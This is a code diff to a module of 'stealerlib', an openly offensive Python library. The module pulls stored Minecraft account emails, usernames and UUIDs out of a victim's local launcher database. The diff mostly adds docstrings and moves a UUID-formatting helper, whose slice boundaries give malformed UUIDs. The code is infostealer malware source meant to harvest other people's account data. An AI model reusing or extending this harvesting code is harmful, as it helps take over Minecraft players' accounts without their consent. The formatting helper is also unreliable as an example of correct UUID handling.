@@ -17,7 +17,7 @@ from stealerlib.apps.minecraft.types import MinecraftTypes
 
 class Minecraft:
     """This class provides methods for extracting and decrypting information from the local Minecraft database
-
+ 
     Attributes:
         accounts    A list of connected minecraft accounts stored in a list of values or a StealerLib object
         database    The local Minecraft database (of accounts) that we're reading from
@@ -47,11 +47,31 @@ class Minecraft:
         except:
             raise NoDatabaseFoundError("Couldn't open the Minecraft Launcher Profiles' Database")
 
+    @staticmethod
+    def convert_uuid(uuid: str) -> str:
+        """Formats the passed UUID (Unique User Identifier) into a more readable format
+
+        Returns:
+            str: The formatted UUID string
+        """
+
+        return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"
+
     @catch
     def get_accounts(
         self,
         conv: Optional[bool]=True
     ) -> list[Union[list, MinecraftTypes.Account]]:
+        """Gets all of the locally stored Minecraft accounts from the database
+        
+        Parameters:
+            self (object): The object passed to the method
+            conv (bool): Boolean whether to append the data as a converted value or a StealerLib object
+
+        Returns:
+            list: A list of the grabbed Minecraft accounts information, stored in another list or a StealerLib object
+        """
+
         if self.database:
             replace_username = lambda u : u.replace("_", "\\_")
 
@@ -64,7 +84,7 @@ class Minecraft:
                 username = name_object["displayName"]
                 uuid, name_object = list(items)[0]
 
-                obj_accounts = MinecraftTypes.Account(
+                obj_account = MinecraftTypes.Account(
                     email=email,
                     username=replace_username(username),
                     uuid=self.convert_uuid(uuid),
@@ -72,11 +92,7 @@ class Minecraft:
                 )
 
                 self.accounts.append(
-                    obj_accounts.conv() if conv else obj_accounts
+                    obj_account.conv() if conv else obj_account
                 )
 
         return self.accounts
-
-    @staticmethod
-    def convert_uuid(uuid: str) -> str:
-        return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"
